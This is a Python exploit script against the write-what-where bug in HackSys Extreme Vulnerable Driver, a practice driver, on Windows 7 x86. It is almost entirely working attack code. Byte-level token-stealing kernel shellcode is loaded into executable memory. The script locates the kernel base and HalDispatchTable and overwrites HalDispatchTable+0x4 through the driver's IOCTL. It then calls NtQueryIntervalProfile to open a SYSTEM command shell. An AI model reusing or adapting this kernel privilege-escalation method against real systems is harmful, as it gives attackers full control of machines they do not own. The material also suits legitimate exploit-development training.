#!/etc/python
#Written by: Jb05s
#Purpose: HEVD - Write-What-Where (Windows 7 x86)

import struct, sys
from ctypes import *
from subprocess import *

class WriteWhatWhere(Structure):
	_fields_ = [
	    ("What", c_void_p),
	    ("Where", c_void_p)
	]

def main():
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll

    shellcode = bytearray(
        "\x90\x90\x90\x90"                # NOPs
        "\x60"                            # pushad --> Save registers state
        "\x31\xC0"                        # xor eax,eax --> Set to 0 (Start of Token Stealing)
        "\x64\x8B\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124] --> Get nt!_KPCR.PcrbData.CurrentThread
        "\x8B\x40\x50"                    # mov eax,[eax+0x50] --> Get nt!_KTHREAD.ApcState.Process
        "\x89\xC1"                        # mov ecx,eax --> Copy current process _EPROCESS structure
        "\xBA\x04\x00\x00\x00"            # mov edx,0x4 --> Windows 7 'SYSTEM' process PID = 0x4
        "\x8B\x80\xB8\x00\x00\x00"        # mov eax,[eax+0xb8] --> Get nt!_EPROCESS.ActiveProcessLinks.Flink
        "\x2D\xB8\x00\x00\x00"            # sub eax,0xb8
        "\x39\x90\xB4\x00\x00\x00"        # cmp [eax+0xb4],edx --> Get nt!_EPROCESS.UniqueProcessId
        "\x75\xED"                        # jnz 0x1a
        "\x8B\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8] --> Get 'SYSTEM' process nt!_EPROCESS.Token
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx --> Replace target process nt!_EPROCESS.Token with 'SYSTEM' process nt!_EPROCESS.Token
        "\x61"                            # popad --> Restore registers state
        "\x31\xC0"                        # xor eax,eax --> Set to 0 (Start normal execution flow)
        "\x83\xC4\x24"                    # add esp,byte + 0x24
        "\x5D"                            # pop ebp
        "\xC2\x08\x00"                    # ret 0x8 --> (Finish normal execution flow)
    )

    """
     LPVOID VirtualAlloc(
      LPVOID lpAddress,
      SIZE_T dwSize,
      DWORD  flAllocationType,
      DWORD  flProtect
    );
    """

    pntr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)

    """
    VOID RtlMoveMemory(
      _Out_       VOID UNALIGNED *Destination,
      _In_  const VOID UNALIGNED *Source,
      _In_        SIZE_T         Length
    );
    """

    kernel32.RtlMoveMemory(c_int(pntr), buff, c_int(len(shellcode)))
    shellcode_addr = id(shellcode) + 20
    shellcode_finale = struct.pack("<L", pntr)
    shellcode_finale_addr = id(shellcode_finale) + 20

    print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_addr))
    print "[+] Pointer for ring0 shellcode: {0}".format(hex(shellcode_finale_addr))

    #Enumerating load addresses for all device drivers
    enum_base = (c_ulong * 1024)()

    """
    BOOL EnumDeviceDrivers(
      LPVOID  *lpImageBase,
      DWORD   cb,
      LPDWORD lpcbNeeded
    );
    """

    enum = psapi.EnumDeviceDrivers(byref(enum_base), c_int(1024), byref(c_long()))

    if not enum:
        print "Failed to enumerate!"
        sys.exit(-1)
    for base_address in enum_base:
        if not base_address:
            continue
        base_name = c_char_p("\x00" * 1024)

        """
        DWORD GetDeviceDriverBaseNameA(
          LPVOID ImageBase,
          LPSTR  lpFilename,
          DWORD  nSize
        );
        """

        driver_base_name = psapi.GetDeviceDriverBaseNameA(base_address, base_name, 48)
        if not driver_base_name:
            print "Unable to get driver base name!"
            sys.exit(-1)
        if base_name.value.lower() == 'ntkrnl' or 'ntkrnl' in base_name.value.lower():
            base_name = base_name.value
            print "[+] Loaded Kernel: {0}".format(base_name)
            print "[+] Base Address of Loaded Kernel: {0}".format(hex(base_address))
            break

    """
    HMODULE LoadLibraryExA(
      LPCSTR lpLibFileName,
      HANDLE hFile,
      DWORD  dwFlags
    );
    """

    kernel_handle = kernel32.LoadLibraryExA(base_name, None, 0x00000001)
    if not kernel_handle:
        print "Unable to get Kernel Handle"
        sys.exit(-1)

    """
    FARPROC GetProcAddress(
      HMODULE hModule,
      LPCSTR  lpProcName
    );
    """
 
    HAL_table_address = kernel32.GetProcAddress(kernel_handle, 'HalDispatchTable')
 
    # Subtracting ntkrnlpa base in user space
    HAL_table_address -= kernel_handle
     
    # To find the HalDispatchTable address in kernel space, add the base address of ntkrnpa in kernel space
    HAL_table_address += base_address
     
    # Just add 0x4 to HAL address for HalDispatchTable+0x4
    HAL_add_4 = HAL_table_address + 0x4
     
    print "[+] HalDispatchTable    : {0}".format(hex(HAL_table_address))
    print "[+] HalDispatchTable+0x4: {0}".format(hex(HAL_add_4))

    #What-Where
    www = WriteWhatWhere()
    www.What = shellcode_finale_addr
    www.Where = HAL_add_4
    www_pointer = pointer(www)

    print "[+] What: {0}".format(hex(www.What))
    print "[+] Where {0}".format(hex(www.Where))

    vulnDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
 
    if not vulnDevice or vulnDevice == -1:
        print "Unable to get driver handle."
        sys.exit(-1)
    else:
    	print "Collecting driver information.."
    	print ""

    print "Sending buffer.."

    #hex((0x00000022 << 16) | (0x00000000 << 14) | (0x802 << 2) | 0x00000003) = 0x22200b
    kernel32.DeviceIoControl(vulnDevice, 0x22200B, www_pointer , 0x8, None, 0, byref(c_ulong()), None)

    #Call NtQueryIntervalProfile function to execute shellcode
    ntdll.NtQueryIntervalProfile(0x1337, byref(c_ulong()))
    print "[+] nt authority\system shell incoming.."
    Popen("start cmd", shell = True)

if __name__ == "__main__":
    main()
